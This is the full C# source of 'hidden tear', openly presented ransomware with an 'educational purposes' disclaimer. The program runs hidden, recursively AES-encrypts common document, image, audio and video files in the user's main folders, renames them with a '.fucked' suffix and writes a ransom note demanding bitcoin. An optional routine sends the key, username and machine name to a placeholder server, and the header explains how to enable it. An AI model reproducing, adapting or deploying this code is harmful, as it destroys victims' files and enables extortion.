﻿/*
 _     _     _     _              _                  
| |   (_)   | |   | |            | |                 
| |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
| '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
| | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
|_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|  
                    ___    ___  
                   |__ \  / _ \ 
                      ) || | | |
                     / / | | | |
                    / /_ | |_| |
                   |____(_)___/ 
 * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com
 * Code update by MarcAngio / August 2015 Italy / github.com/MarcAngio
 * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
 * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
 * 
 * Ve durdu saatler 
 * Susuyor seni zaman
 * Sesin dondu kulagimda
 * Dedi uykudan uyan
 * 
 * Yine boyle bir aksamdi
 * Sen guluyordun ya gozlerimin icine
 * Feslegenler boy vermisti
 * Gokten parlak bir yildiz dustu pesine
 * Sakladim gozyaslarimi
 * 
 * Go to startAction() to change your password 
 * or insert CreatePassword without "" and abilitate SendPassword in StartAction() to abilitate random password to send at your server
 */

using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;


namespace hidden_tear
{
    public partial class Form1 : Form
    {
        //Url to send encryption password and computer info
        string targetURL = "https://www.example.com/cryptofucker/write.php?info=";
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\";



        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            //starts encryption at form load
            startAction();

        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        //AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        //creates random password for encryption
        public string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--){
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        //Sends created password target location
        public void SendPassword(string password){
            
            string info = computerName + "-" + userName + " " + password;
            var fullUrl = targetURL + info;
            var conent = new System.Net.WebClient().DownloadString(fullUrl);
        }

        //Encrypts single file
        public void EncryptFile(string file, string password)
        {

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file+".fucked");

            
            

        }

        //encrypts target directory
        public void encryptDirectory(string location, string password)
        {

            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".index", ".pdf", ".zip", ".rar", ".css", ".lnk", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".bmp", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".bk", ".bat", ".mp3", ".mp4", ".wav", ".wma", ".avi", ".divx", ".mkv", ".mpeg", ".wmv", ".mov", ".ogg"
            };
                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);
                    for (int i = 0; i < files.Length; i++)
                    {
                        try
                        {    
                            string extension = Path.GetExtension(files[i]);
                            if (validExtensions.Contains(extension))
                            {
                            EncryptFile(files[i], password);
                            }
                         }
                        catch (SystemException)
                        {
                            continue;
                        }
                    }

                for (int i = 0; i < childDirectories.Length; i++)
                {   
                    try
                    {
                        encryptDirectory(childDirectories[i],password);
                    }
                    catch (SystemException)
                    {
                        continue;
                    }
                }
             

        }

        public void startAction()
        {
            string password = "YOURPASSWORDHERE";
            string path = "\\Desktop";
            string pathdow2 = "\\Downloads";
            string pathdoc = "\\Documents";
            string pathim = "\\Pictures";
            string pathmu = "\\Music";
            string pathvi = "\\Videos";
            string startPath = userDir + userName + path;
            string startPathdow = userDir + userName + pathdow2;
            string startPathdoc = userDir + userName + pathdoc;
            string startPathim = userDir + userName + pathim;
            string startPathmu = userDir + userName + pathmu;
            string startPathvi = userDir + userName + pathvi;
            //SendPassword(password);
            encryptDirectory(startPath,password);
            encryptDirectory(startPathdow, password);
            encryptDirectory(startPathdoc, password);
            encryptDirectory(startPathim, password);
            encryptDirectory(startPathmu, password);
            encryptDirectory(startPathvi, password);
            messageCreator();
            password = null;
            System.Windows.Forms.Application.Exit();
        }
            
        public void messageCreator()
        {
            string path = "\\Desktop\\READ_IT.txt";
            string fullpath = userDir + userName + path;
            string[] lines = { "Files have been encrypted by Hidden tear","Send me some bitcoin or kebab....or COOOOOOKIEEEEESSS", "And I also hate night clubs, desserts, being drunk." };
            System.IO.File.WriteAllLines(fullpath, lines);
        }
    }
}
